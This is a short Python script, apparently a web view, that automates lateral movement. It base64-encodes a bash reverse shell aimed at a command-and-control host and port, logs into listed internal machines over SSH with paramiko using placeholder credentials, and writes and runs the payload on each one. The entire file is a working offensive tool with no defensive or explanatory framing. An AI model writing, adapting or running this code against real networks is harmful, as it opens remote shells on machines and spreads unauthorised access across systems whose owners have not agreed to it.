import paramiko
import base64

def generate_payload(ip, port):
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    payload_bytes = payload.encode('ascii')
    base64_bytes = base64.b64encode(payload_bytes)
    base64_payload = base64_bytes.decode('ascii')

    return base64_payload

def auto_lateral_movement(request):
    targets = ["192.168.0.2", "192.168.0.3"]  # Replace with actual target IPs
    username = "user"  # Replace with actual username
    password = "password"  # Replace with actual password
    ip = "127.0.0.1"  # The IP of the command and control server.
    port = 4444  # The port the command and control server is listening on.
    
    payload = generate_payload(ip, port)

    for target in targets:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=username, password=password)

        stdin, stdout, stderr = ssh.exec_command(f"echo {payload} | base64 -d > /tmp/command.sh")
        stdin, stdout, stderr = ssh.exec_command("bash /tmp/command.sh")

    return HttpResponse("Lateral movement attempted")
